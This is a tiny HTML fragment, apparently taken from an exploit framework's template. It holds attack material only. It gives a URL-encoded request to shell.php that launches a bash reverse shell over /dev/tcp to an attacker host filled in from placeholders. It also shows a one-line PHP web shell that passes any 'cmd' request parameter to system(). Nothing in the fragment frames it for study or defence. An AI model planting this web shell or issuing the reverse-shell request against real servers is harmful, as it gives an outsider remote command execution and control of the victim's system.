<div>Trigger a reverse shell with: shell.php?cmd=%2Fbin%2Fbash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F{{datastore.lhost}}%2F{{datastore.lport}}+0%3E%261%27</div>

<div>Result:</div>
<pre><?= system($_REQUEST['cmd']) ?></pre>
